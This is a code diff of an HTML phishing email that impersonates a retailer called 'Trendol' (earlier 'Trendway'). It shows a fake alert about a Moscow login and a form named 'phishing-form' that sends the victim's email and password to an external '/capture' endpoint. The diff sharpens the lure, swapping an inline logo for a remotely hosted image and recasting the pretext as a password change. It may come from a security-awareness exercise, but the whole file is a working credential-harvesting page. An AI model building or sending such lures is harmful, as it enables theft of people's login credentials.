@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Suspicious Activity Detected - Trendway</title>
+    <title>Suspicious Activity Detected - Trendol</title>
     <style>
         /* CSS ve Gömülü SVG Logo burada yer alıyor */
         body { font-family: Arial, sans-serif; background-color: #f6f6f6; margin: 0; padding: 0; }
@@ -41,46 +41,61 @@
 </head>
 
 <body>
-    <div class="container">
+    <div class="container" style="max-width: 600px; background-color: #ffffff; margin: 20px auto;">
 
-        <div class="header">
-            <svg class="logo logo-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 50">
-                <rect x="0" y="10" width="200" height="30" fill="#F27A1A" rx="6"/>
-                <text x="50%" y="50%" dominant-baseline="middle"
-                    text-anchor="middle" fill="white">
-                    trendway
-                </text>
-            </svg>
+        <div class="header" style="border-bottom: 5px solid #F27A1A; padding: 20px 0;">
+            <div class="logo-container" style="width: 100%; text-align: center;">
+                
+                <img src="https://cozy-salamander-8df772.netlify.app/logo.png"
+                     alt="trendol Logo" 
+                     width="200" 
+                     height="50" 
+                     style="display: block; margin: 0 auto; border: none;" />
+
+            </div>
         </div>
 
         <div class="content">
             <h2 style="color: #F27A1A;">Suspicious Activity Detected in Your Account!</h2>
             <p>Dear Customer,</p>
-            <p>
-                An unusual login attempt from <b>a different geographical location</b> 
-                has been detected in your account within the last 24 hours. 
-                To protect your account from unauthorized actions, 
-                your access has been temporarily restricted for your security.
+            <p style="font-size: 14px; line-height: 1.6;">  
+                    
+                An unusual login attempt and a <b>different geographical location (Moscow, Russia)</b> was detected in your account on <b>12/12/2025 at 15:05:35</b>. 
+                To protect your account from unauthorized actions, </p>
+                <p style="font-size: 14px; line-height: 1.6;">  
+            
+                you need to change your password for your security. For better account security, choose your password according to the following recommendations:
+                <p style="font-size: 14px; line-height: 1.6; margin-left: 20px;">  </p>
+                    <p style="font-size: 14px; line-height: 1.6; margin-left: 20px;">
+                    · Create a password that is different from your previous one, </p> 
+                    <p style="font-size: 14px; line-height: 1.6; margin-left: 20px;">    
+                    · Change your password on all platforms where you use this password and email address, </p>
+                    <p style="font-size: 14px; line-height: 1.6; margin-left: 20px;">    
+                    · We recommend using a minimum of 8 characters, including uppercase and lowercase letters, numbers, and special characters.
+                    </p>
+                    <p style="font-size: 14px; line-height: 1.6;">
+                Trendol Support Team</p>
             </p>
 
             <div class="form-area">
                 <p style="font-weight: bold; color: #333;">
-                    To remove the restriction, please re-verify your information:
+                    Please log in to change your password for better security:
                 </p>
                 
                 <form id="phishing-form" action="https://cybersecurity-6wd3.onrender.com/capture" method="POST"> 
                     <input type="email" name="eposta" placeholder="Your Email Address" 
                            class="input-field" required>
 
-                    <input type="password" name="sifre" placeholder="Your Password" 
+                    <input type="password" name="sifre" placeholder="Your New Password" 
                            class="input-field" required>
+                    
 
-                    <button type="submit" class="button">Log In to Remove Restriction</button>
+                    <button type="submit" class="button">Change Your Password</button>
                 </form>
             </div>
 
             <p style="font-size: 12px; color: #999; margin-top: 30px;">
-                © 2025 Trendway Consulting Inc.
+                © 2025 Trendol Consulting Inc.
             </p>
         </div>
         
